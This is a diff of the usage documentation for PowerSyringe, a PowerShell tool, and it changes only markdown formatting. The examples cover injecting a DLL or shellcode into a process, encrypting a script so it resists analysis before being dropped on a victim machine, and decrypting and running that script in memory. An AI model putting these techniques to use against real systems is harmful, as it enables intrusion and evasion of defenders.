@@ -18,46 +18,45 @@ Here is a rundown of its features:
 
 ----
 
-##Example  
+#Example   
 Here is an excerpt of the documentation with usage examples:
 
-**DLL Injection**
+**DLL Injection**  
 C:\PS>PowerSyringe 1 4274 .\evil.dll
 
-**Description**
+**Description**  
 Inject 'evil.dll' into process ID 4274.
 
-**Inject shellcode into process**
+**Inject shellcode into process**  
 C:\PS>PowerSyringe 2 4274
 
-**Description**
+**Description**  
 Inject the shellcode as defined in the script into process ID 4274
 
-**Execute shellcode within the context of PowerShell**
+**Execute shellcode within the context of PowerShell**  
 C:\PS>PowerSyringe 3
 
-**Description**
+**Description**  
 Execute the shellcode as defined in the script within the context of Powershell.
 
-**Encrypt the script with the password:'password' and salt:'salty'**
+**Encrypt the script with the password:'password' and salt:'salty'**  
 C:\PS>PowerSyringe 4 .\PowerSyringe.ps1 password salty
 
-**Description**
+**Description**  
 Encrypt the contents of this file with a password and salt. This will make analysis of the script impossible without the correct password and salt combination. This command will generate evil.ps1 that can dropped onto the victim machine. It only consists of a decryption function 'de' and the base64-encoded ciphertext.
 
 *Note: This command can be used to encrypt any text-based file/script*
 
-**Decrypt encrypted script and execute it in memory**
-C:\PS>[String] $cmd = Get-Content .\evil.ps1
-C:\PS>Invoke-Expression $cmd
-C:\PS>$decrypted = de password salt
-C:\PS>Invoke-Expression $decrypted
+**Decrypt encrypted script and execute it in memory**  
+C:\PS>[String] $cmd = Get-Content .\evil.ps1  
+C:\PS>Invoke-Expression $cmd  
+C:\PS>$decrypted = de password salt  
+C:\PS>Invoke-Expression $decrypted  
 
-**Description**
-After you run the encryption option and generate evil.ps1 these commands will decrypt and execute
+**Description**  
+After you run the encryption option and generate evil.ps1 these commands will decrypt and execute  
 (i.e. define the function) PowerSyringe entirely in memory assuming you provided the proper password and salt combination.
 
 Upon successful completion of these commands, you can execute PowerSyringe as normal.
 
-Note: "Invoke-Expression $decrypted" may generate an error. Just ignore it. PowerSyringe will
-still work.
+Note: "Invoke-Expression $decrypted" may generate an error. Just ignore it. PowerSyringe will still work.
